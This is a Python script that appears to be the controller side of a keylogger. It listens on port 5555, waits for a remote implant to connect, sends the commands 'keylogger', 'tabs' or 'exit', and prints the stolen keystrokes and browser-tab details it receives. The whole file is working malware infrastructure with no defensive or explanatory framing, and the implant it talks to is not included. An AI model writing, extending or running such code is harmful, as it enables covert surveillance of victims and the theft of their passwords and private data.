import socket
import threading

HOST = '0.0.0.0'
PORT = 5555

server = socket.socket()
server.bind((HOST, PORT))
server.listen(1)
print("[+] Logger server listening...")

client, addr = server.accept()
print(f"[+] Logger connected by {addr}")

def receive_keylogs(sock):
    print("[*] Receiving keystrokes:")
    while True:
        data = sock.recv(1024).decode()
        if data.startswith("[TABS]") or not data:
            break
        print(data, end='', flush=True)

def receive_tabs(sock):
    print("\n[*] Browser tabs info:")
    while True:
        data = sock.recv(1024).decode()
        if data == "[ENDTABS]" or not data:
            break
        print(data)

try:
    while True:
        cmd = input("Enter command (keylogger/tabs/exit): ").strip()
        client.send(cmd.encode())
        if cmd == 'keylogger':
            receive_keylogs(client)
        elif cmd == 'tabs':
            receive_tabs(client)
        elif cmd == 'exit':
            break
        else:
            print("[!] Unknown command")
except Exception as e:
    print(f"[!] Error: {e}")

client.close()
server.close()
